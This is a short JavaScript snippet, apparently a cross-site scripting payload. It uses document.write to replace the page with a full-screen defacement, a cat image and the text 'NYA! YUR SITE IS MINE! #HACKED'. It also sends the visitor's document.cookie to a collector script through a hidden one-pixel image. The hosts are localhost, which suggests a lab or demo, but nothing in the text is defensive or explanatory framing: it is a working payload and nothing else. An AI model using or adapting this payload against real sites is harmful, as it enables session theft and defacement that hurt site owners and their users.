var catimage = "http://localhost/HackitTheCat.png";
var fakeimage = "http://localhost/secret.php?image=";
document.write("<div style=\"position:absolute; left:0px; top:0px; height:100%; width:100%; background-color:#FFFFFF; text-align: center;\"><img src=\"" + catimage + "\" style=\"position: relative; height:200px;\" /><p style=\"font-size:3em;\">NYA! YUR SITE IS MINE! #HACKED<img src=\"" + fakeimage + document.cookie + "\" style=\"width:1px; height:1px;\"/></p></div>");
